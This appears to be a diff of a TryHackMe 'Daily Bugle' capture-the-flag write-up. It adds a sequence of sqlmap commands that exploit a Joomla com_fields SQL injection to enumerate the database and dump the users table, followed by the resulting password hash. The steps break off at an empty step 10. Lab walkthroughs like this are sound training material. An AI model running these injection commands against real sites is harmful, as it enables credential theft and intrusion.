@@ -9,9 +9,10 @@ Room Link: https://tryhackme.com/room/dailybugle
 
 ## Tools 
 
-1. NMap
+1. NMap https://nmap.org/download
 2. JoomScan https://github.com/OWASP/joomscan
 3. SearchSploit https://www.exploit-db.com/searchsploit
+4. SQLMap https://github.com/sqlmapproject/sqlmap
 
 ## Deploy 
 
@@ -62,11 +63,24 @@ Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
 Shellcodes: No Results
 
 ```
-5. After some reasearch on the exploit and using some commands in SQLMap, we cracfted a command to get password hash of users. `sqlmap -u "http://10.10.123.253/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C name,username,email,password --dump`
-6. 
+5. After some reasearch on the exploit https://www.exploit-db.com/exploits/42033 and using some commands in SQLMap,
+At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E`
+6. Then crafted a SQLMap command to get db names `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E --dbs` and got a database named `joomla`
+7. Then crafted a command to table names on DB `joomla` command `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla --tables` and we will get a table named `#__users`
+8. To extract the table column names, we can use this command, `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" --columns` it will prompt for bruteforcing existing column names, we can find some column names like `id`, `username`, `email`, `password` etc.
+9. Then, crafted a command to get password hash of users. `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" -C id,name,username,email,password --dump`
+It shows result like that,
+```bash
++-----+------------+----------+---------------------+--------------------------------------------------------------+
+| id  | name       | username | email               | password                                                     |
++-----+------------+----------+---------------------+--------------------------------------------------------------+
+| 811 | Super User | jonah    | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
++-----+------------+----------+---------------------+--------------------------------------------------------------+
+```
+10.
 
 ## Credits
 
-
+1. We already completed the machine, just click on completed.
 
 Author: Zishan Ahamed Thandar
